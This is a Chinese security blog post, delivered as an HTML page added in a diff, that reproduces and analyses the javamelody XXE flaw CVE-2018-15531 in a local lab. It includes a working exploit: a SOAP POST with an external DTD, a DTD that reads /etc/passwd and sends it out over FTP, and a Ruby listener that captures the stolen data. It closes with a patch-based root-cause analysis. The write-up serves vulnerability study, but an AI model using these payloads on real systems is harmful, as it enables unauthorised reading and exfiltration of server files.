@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="javamelody XXE(CVE-2018-15531) 复现分析javaMelody是Spring Boot框架可用的一个监视服务器运行信息的插件，这个插件去年爆出了一个XXE的漏洞。这篇文章便分析一下这个漏洞。 漏洞复现环境搭建这里我使用了Idea来搭建spring boot的环境，创建好spring boot项目后在pom.xml的dependencies中加入 12345&amp;lt;dep">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="javamelody XXE(CVE-2018-15531) 复现分析">
+<meta property="og:url" content="https://hexo.imagemlt.xyz/post/melodyXXE/index.html">
+<meta property="og:site_name" content="Image&#39;s blog">
+<meta property="og:description" content="javamelody XXE(CVE-2018-15531) 复现分析javaMelody是Spring Boot框架可用的一个监视服务器运行信息的插件，这个插件去年爆出了一个XXE的漏洞。这篇文章便分析一下这个漏洞。 漏洞复现环境搭建这里我使用了Idea来搭建spring boot的环境，创建好spring boot项目后在pom.xml的dependencies中加入 12345&amp;lt;dep">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1g16pwokvj1j30oh05i3zn.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcly1g16q2l7rxaj30t90gnq70.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1g16q4h0wdej30sb0a9gns.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcly1g16q6l8dpmj30i706y0tn.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1g16q845gxxj311f0crq5y.jpg">
+<meta property="og:updated_time" content="2019-03-18T02:21:38.464Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="javamelody XXE(CVE-2018-15531) 复现分析">
+<meta name="twitter:description" content="javamelody XXE(CVE-2018-15531) 复现分析javaMelody是Spring Boot框架可用的一个监视服务器运行信息的插件，这个插件去年爆出了一个XXE的漏洞。这篇文章便分析一下这个漏洞。 漏洞复现环境搭建这里我使用了Idea来搭建spring boot的环境，创建好spring boot项目后在pom.xml的dependencies中加入 12345&amp;lt;dep">
+<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1g16pwokvj1j30oh05i3zn.jpg">
+
+
+
+
+
+
+  <link rel="canonical" href="https://hexo.imagemlt.xyz/post/melodyXXE/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>javamelody XXE(CVE-2018-15531) 复现分析 | Image's blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+	<a href="https://github.com/imagemlt"><img style="position: absolute; top: 0; right: 0; border: 0;z-index:1" src="https://s3.amazonaws.com/github/ribbons/forkme_right_orange_ff7600.png" alt="Fork me on GitHub"></a>
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Image's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <h1 class="site-subtitle" itemprop="description">Welcome to Image's Blog</h1>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-links">
+    <a href="/links/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-link"></i> <br>Links</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/melodyXXE/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">javamelody XXE(CVE-2018-15531) 复现分析
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-03-18 10:20:23 / Modified: 10:21:38" itemprop="dateCreated datePublished" datetime="2019-03-18T10:20:23+08:00">2019-03-18</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="javamelody-XXE-CVE-2018-15531-复现分析"><a href="#javamelody-XXE-CVE-2018-15531-复现分析" class="headerlink" title="javamelody XXE(CVE-2018-15531) 复现分析"></a>javamelody XXE(CVE-2018-15531) 复现分析</h1><p>javaMelody是Spring Boot框架可用的一个监视服务器运行信息的插件，这个插件去年爆出了一个XXE的漏洞。这篇文章便分析一下这个漏洞。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这里我使用了Idea来搭建spring boot的环境，创建好spring boot项目后在<code>pom.xml</code>的<code>dependencies</code>中加入</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.bull.javamelody<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javamelody-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.73.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>之后启动程序，访问<code>127.0.0.1:8080/monitoring</code>便可以验证是否加载成功插件。</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞复现使用的poc为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Content-type: text/xml</span><br><span class="line">SOAPAction: aaaaa</span><br><span class="line">Content-Length: 154</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:5678/ev.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+<p>在本地起一个监听5678端口的http服务，这里我用的是php</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g16pwokvj1j30oh05i3zn.jpg" alt="76CFCEA4-4D3C-45E3-A98A-E1930AC33A0D"></p>
+<p>可以看到发包后可以收到http请求，因此存在XXE漏洞。</p>
+<p>为了完成盲打读取文件的功能，ev.dtd的内容如下:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">payload</span> <span class="attr">SYSTEM</span>	"<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://127.0.0.1:2121/%payload;'&gt;"&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
+<p>使用如下的ruby脚本可以创建一个用于获取ftp请求的ftp服务器:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line"></span><br><span class="line">ftp_server = TCPServer.new <span class="number">2121</span></span><br><span class="line">http_server = TCPServer.new <span class="number">8088</span></span><br><span class="line"></span><br><span class="line">log = File.open( <span class="string">"xxe-ftp.log"</span>, <span class="string">"a"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'&lt;!ENTITY % asd SYSTEM "file:///etc/passwd"&gt;'</span></span><br><span class="line"></span><br><span class="line">Thread.start <span class="keyword">do</span></span><br><span class="line">loop <span class="keyword">do</span></span><br><span class="line">  Thread.start(http_server.accept) <span class="keyword">do</span> <span class="params">|http_client|</span></span><br><span class="line">	puts <span class="string">"HTTP. New client connected"</span></span><br><span class="line">	loop &#123;</span><br><span class="line">		req = http_client.gets()</span><br><span class="line">		<span class="keyword">break</span> <span class="keyword">if</span> req.<span class="literal">nil</span>?</span><br><span class="line">		<span class="keyword">if</span> req.start_with? <span class="string">"GET"</span></span><br><span class="line">			http_client.puts(<span class="string">"HTTP/1.1 200 OK\r\nContent-length: <span class="subst">#&#123;payload.length&#125;</span>\r\n\r\n<span class="subst">#&#123;payload&#125;</span>"</span>)</span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">		puts req</span><br><span class="line">	&#125;</span><br><span class="line">	puts <span class="string">"HTTP. Connection closed"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">Thread.start <span class="keyword">do</span></span><br><span class="line">loop <span class="keyword">do</span></span><br><span class="line">  Thread.start(ftp_server.accept) <span class="keyword">do</span> <span class="params">|ftp_client|</span></span><br><span class="line">	puts <span class="string">"FTP. New client connected"</span></span><br><span class="line">	ftp_client.puts(<span class="string">"220 xxe-ftp-server"</span>)</span><br><span class="line">	loop &#123;</span><br><span class="line">		req = ftp_client.gets()</span><br><span class="line">		<span class="keyword">break</span> <span class="keyword">if</span> req.<span class="literal">nil</span>?</span><br><span class="line">		puts <span class="string">"&lt; "</span>+req</span><br><span class="line">		log.write <span class="string">"get req: <span class="subst">#&#123;req.inspect&#125;</span>\n"</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> req.<span class="keyword">include</span>? <span class="string">"LIST"</span></span><br><span class="line">			ftp_client.puts(<span class="string">"drwxrwxrwx 1 owner group          1 Feb 21 04:37 test"</span>)</span><br><span class="line">			ftp_client.puts(<span class="string">"150 Opening BINARY mode data connection for /bin/ls"</span>)</span><br><span class="line">			ftp_client.puts(<span class="string">"226 Transfer complete."</span>)</span><br><span class="line">		<span class="keyword">elsif</span> req.<span class="keyword">include</span>? <span class="string">"USER"</span></span><br><span class="line">			ftp_client.puts(<span class="string">"331 password please - version check"</span>)</span><br><span class="line">		<span class="keyword">elsif</span> req.<span class="keyword">include</span>? <span class="string">"PORT"</span></span><br><span class="line">			puts <span class="string">"! PORT received"</span></span><br><span class="line">			puts <span class="string">"&gt; 200 PORT command ok"</span></span><br><span class="line">			ftp_client.puts(<span class="string">"200 PORT command ok"</span>)</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			puts <span class="string">"&gt; 230 more data please!"</span></span><br><span class="line">			ftp_client.puts(<span class="string">"230 more data please!"</span>)</span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">	&#125;</span><br><span class="line">	puts <span class="string">"FTP. Connection closed"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">loop <span class="keyword">do</span></span><br><span class="line">	sleep(<span class="number">10000</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>运行脚本，Burp重新发包即可获取本地文件。</p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>根据大佬们的分析流程，直接查看之后的版本的patch可以定位导致漏洞出现的地方:</p>
+<p><a href="https://github.com/javamelody/javamelody/commit/ef111822562d0b9365bd3e671a75b65bd0613353">https://github.com/javamelody/javamelody/commit/ef111822562d0b9365bd3e671a75b65bd0613353</a></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g16q2l7rxaj30t90gnq70.jpg" alt="image-20190318100820061"></p>
+<p>可以看到官方的修复中直接禁用了XML中引用外部实体。我们跟进目标代码附近</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g16q4h0wdej30sb0a9gns.jpg" alt="8D9C800F-F636-422B-8D4C-80F1619A9FAF"></p>
+<p>可以看到这段代码是一个典型的XXE的漏洞代码。全局查找使用了<code>parseSoapMethodName</code>的地方</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g16q6l8dpmj30i706y0tn.jpg" alt="1D975EC2-AC3B-4978-B76D-AA2786281677"></p>
+<p>跟进<code>initialize</code>方法</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g16q845gxxj311f0crq5y.jpg" alt="image-20190318101340130"></p>
+<p>可以看到漏洞利用方法构造的要素:</p>
+<ul>
+<li>POST方法</li>
+<li>Content-type:为<code>application/soap+xml</code>或者Content-type为<code>text/xml</code>且存在<code>SOAPAction</code>请求头</li>
+</ul>
+<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzA4ODc0MTIwMw==&amp;mid=2652531539&amp;idx=1&amp;sn=82d1f41acc32a0a21dff60b2dfb71421&amp;source=41#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzA4ODc0MTIwMw==&amp;mid=2652531539&amp;idx=1&amp;sn=82d1f41acc32a0a21dff60b2dfb71421&amp;source=41#wechat_redirect</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/post/php-extension/index.html" rel="next" title="php_extension">
+                <i class="fa fa-chevron-left"></i> php_extension
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4" alt="Imagemlt">
+            
+              <p class="site-author-name" itemprop="name">Imagemlt</p>
+              <p class="site-description motion-element" itemprop="description">personal blog</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">55</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/imagemlt" target="_blank" title="GitHub" rel="external nofollow"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#javamelody-XXE-CVE-2018-15531-复现分析"><span class="nav-number">1.</span> <span class="nav-text">javamelody XXE(CVE-2018-15531) 复现分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.1.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现-1"><span class="nav-number">1.1.2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原理分析"><span class="nav-number">1.2.</span> <span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文档"><span class="nav-number">1.3.</span> <span class="nav-text">参考文档</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Imagemlt</span>
+
+  
+
+  
+</div>
+
+
+  
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" rel="external nofollow" href="https://github.com/theme-next/hexo-theme-next">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+  <script src="https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js"></script>
+  <script>
+    if (window.mermaid) {
+//alert("mermaid!!!");
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
